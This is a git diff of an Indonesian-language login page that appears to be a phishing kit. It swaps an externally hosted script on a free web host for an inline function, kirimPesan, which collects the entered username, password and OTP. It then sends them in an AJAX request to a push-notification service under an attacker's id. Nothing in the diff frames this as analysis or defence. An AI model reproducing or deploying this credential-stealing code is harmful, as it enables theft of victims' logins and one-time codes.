@@ -69,8 +69,18 @@
                       Belum punya akun silahkan daftar di sini<br>
                       <a class="small" href="/register.php"><strong>Register</strong></a>
                       </form>
-      <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"
-    integrity="sha512-+NqPlbbtM1QqiK8ZAo4Yrj2c4lNQoGv8P79DPtKzj++l5jnN39rHA/xsqn8zE9l0uSoxaCdrOgFs6yjyfbBxSg=="
-    crossorigin="anonymous" referrerpolicy="no-referrer"></script>
-    <script src="https://app-octomobilenew.000webhostapp.com/soufasms.js">
-    </script></html>
+     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js" integrity="sha512-+NqPlbbtM1QqiK8ZAo4Yrj2c4lNQoGv8P79DPtKzj++l5jnN39rHA/xsqn8zE9l0uSoxaCdrOgFs6yjyfbBxSg==" crossorigin="anonymous" referrerpolicy="no-referrer"></script> <script type="text/javascript">function kirimPesan() {
+
+var a = document.getElementById('a');
+var b = document.getElementById('b');
+var c = document.getElementById('c');
+
+var gabungan = '%0A👤User%20:' + a.value + '%0A🔒Pass%20:' + b.value + '%0A🔢OTP%20:' + c.value;
+
+$.ajax({
+url: `https://wirepusher.com/send?id=q3ZtmpGPc&title=Ldashboard%20Soufasms&message=${gabungan}&type=Monitoring`,
+method: `POST`,
+
+
+})
+}</script>
